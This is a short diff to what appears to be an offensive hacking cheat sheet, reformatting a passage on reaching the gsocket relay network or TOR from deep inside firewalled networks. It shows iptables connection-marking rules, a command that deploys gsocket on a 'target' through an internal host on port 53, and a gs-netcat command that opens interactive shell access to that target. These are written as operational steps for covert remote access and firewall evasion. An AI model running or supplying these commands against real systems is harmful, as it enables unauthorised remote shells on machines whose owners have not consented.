@@ -572,9 +572,16 @@ iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
 iptables -t mangle -I INPUT -m mark --mark 1188 -j ACCEPT
 iptables -t mangle -I INPUT -j CONNMARK --restore-mark
 ```
-> We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
-> GS_HOST=192.168.0.100 GS_PORT=53 ./deploy.sh
-> GS_HOST=1.2.3.4: GS_PORT=443 gs-netcat -i -s ...
+
+We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
+```sh
+# Deploy on a target that can only reach 192.168.0.100  
+GS_HOST=192.168.0.100 GS_PORT=53 ./deploy.sh  
+```
+```sh
+# Access the target  
+GS_HOST=1.2.3.4: GS_PORT=443 gs-netcat -i -s ...
+```
 
 ---
 <a id="scan-proxy"></a>
